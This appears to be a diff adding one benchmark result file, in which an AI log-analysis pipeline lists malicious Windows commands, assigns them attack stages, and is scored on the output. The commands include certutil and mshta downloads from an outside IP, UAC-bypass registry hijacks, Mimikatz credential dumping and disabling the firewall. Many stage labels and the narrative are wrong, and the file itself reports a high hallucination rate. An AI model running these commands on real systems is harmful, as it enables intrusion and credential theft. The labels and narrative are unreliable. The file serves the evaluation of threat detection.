@@ -1,0 +1,219 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "tor.lnk",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "MSHTA http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "dllhost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\\B.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\" /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_dw3ilvea.wnp.ps1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Start-Process .\\T1059.003_script.bat\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group \"domain admins\" /domain\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net localgroup \"domain admins\" /domain\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta C:\\Users\\Administrator\\Desktop\\shell\\Test.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg.exe ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"{New-Item HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force New-ItemProperty HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name DelegateExecute\" -Value '\" -Force Set-ItemProperty HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name (default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force Start-Process \"C:\\Windows\\System32\\fodhelper.exe\"\", \"$env:windir\\system32\\sdclt.exe\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"{New-Item -Force -Path HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe' New-ItemProperty -Force -Path HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name DelegateExecute\" Start-Process -FilePath $env:windir\\system32\\sdclt.exe Start-Sleep -s 3}",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /c RegAdd \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\verifierdlls\" /v \"VerifierDlls\" /t REG_SZ /f /d 1 /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" /v VerifierDlls\" /f\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\" /v Debugger /f\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\verifierdlls\" /v VerifierDlls\" /t REG_SZ /f /d 1 /f\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"taskkill.exe /im Notepad.exe /IM SVCHOST.exe /F\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "taskkill.exe /IM svchost.exe /F",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "\\\\.\\",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": ".\\chromeRemoteServices.ps1",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": ",\\chromeRemoteServices.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "rundll32.exe shell32.dll,Control_RunDLL msiexec.exe /i FileCoauthSetup.exe /qr",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "psexec.exe -sid -accepteula c:\\windows\\syswow64\\inetsrv\\inetinfo.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe & {New-Item HKEY_CURRENT_USER:software\\folders\\shell\\open\\command -Force Set-ItemProperty HKEY_CURRENT_USER:software\\folders\\shell\\open\\command -Name (default) Value C:\\Windows\\System32\\cmd.exe -Force Start-Process C:\\Windows\\System32\\eventvwr.msc}",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module .\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "mimikatz2.exe lsadump:sam exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "taskkill /f /im wordpad.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "taskkill.exe /IM Notepad.exe /IM TaskMgr.exe /F",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "rundll32 user32.dll,LockWorkStation",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C rm /s /q timestomp",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powerprof.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cipher /w:cipherstoragedata.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "rundll32.exe user32.dll,LockWorkStation",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method POST '-UseBasicParsing -ContentType application/json",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "netsh advfirewall show allprofiles && netsh advfirewall set allprofiles state off && echo & pause",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "This complicated attack campaign is characterized by highly sophisticated tactics by the attackers who obtained initial access points through both non-web based attacks such as dllhost.exe downloads, commands run in MSHTA debugger sessions, etc., as well as some web-based attacks such as the SangForCat program and mimikatz-related executables. After initial access has been gained, the attackers proceed to deploy and enable numerous pieces of malicious software designed for privilege escalation, lateral movement, credential theft, collection of sensitive system and network information, and communication between hosts and with remote servers.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 94181,
+      "completion_tokens": 5512,
+      "total_tokens": 99693,
+      "wall_clock_s": 81.431,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.11904761904761904,
+      "recall": 0.21739130434782608,
+      "f1": 0.15384615384615383,
+      "tp": 5,
+      "fp": 37,
+      "fn": 18
+    },
+    "stage": {
+      "precision": 0.07142857142857142,
+      "recall": 0.125,
+      "f1": 0.09090909090909091,
+      "tp": 3,
+      "fp": 39,
+      "fn": 21,
+      "recall_partial": 0.15217391304347827
+    },
+    "hallucination_rate": 0.27906976744186046,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 94181,
+      "completion_tokens": 5512,
+      "total_tokens": 99693,
+      "wall_clock_s": 81.431,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
